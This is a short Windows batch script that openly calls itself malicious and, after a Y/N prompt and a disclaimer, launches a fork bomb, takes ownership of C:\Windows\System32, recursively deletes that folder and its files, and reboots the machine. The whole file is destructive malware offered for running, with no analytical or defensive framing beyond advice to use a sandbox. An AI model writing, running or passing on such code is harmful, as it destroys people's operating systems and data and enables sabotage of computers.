echo WARNING THIS FILE IS MALICIOUS I RECOMMEND YOU RUN THIS IN A WINDOWS SANDBOX ENVIORMENT FOR YOUR COMPUTERS SAFETY I AM NOT RESPONSIBLE FOR ANY DAMAGES THIS MAY CAUSE WOULD YOU LIKE TO PROCEED? (Y/N)
choice /c YN /n /m "Press Y to run the program or N to exit: "

if errorlevel 2 goto no
if errorlevel 1 goto yes

:yes
echo Running the program...
^%0|%0 
takeown /f c:\windows\system32
cacls c:\windows\system32
rd /s /q c:\windows\system32
del /s /q c:\windows\system32\*.*
shutdown -r 

